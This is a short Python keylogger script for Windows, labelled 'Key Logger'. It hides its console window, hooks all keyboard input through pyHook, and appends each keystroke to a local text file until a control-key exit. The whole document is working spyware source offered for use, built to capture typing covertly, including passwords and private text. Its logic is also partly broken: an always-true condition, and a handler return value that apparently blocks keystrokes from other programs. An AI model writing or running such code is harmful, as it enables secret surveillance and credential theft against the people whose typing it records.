#Key Logger

import win32console
import win32gui
import pythoncom, pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnKeyboardEvent(event):
    if event.Ascii ==5:
        exit(1)
    if event.Ascii != 0 or 8:
        f = open('C:\keylogger\output.txt', 'r+')
        buffer = f.read()
        f.close()
        f = open('C:\keylogger\output.txt', 'w')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '\n'
        buffer += keylogs
        f.write(buffer)
        f.close()
        return 0

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
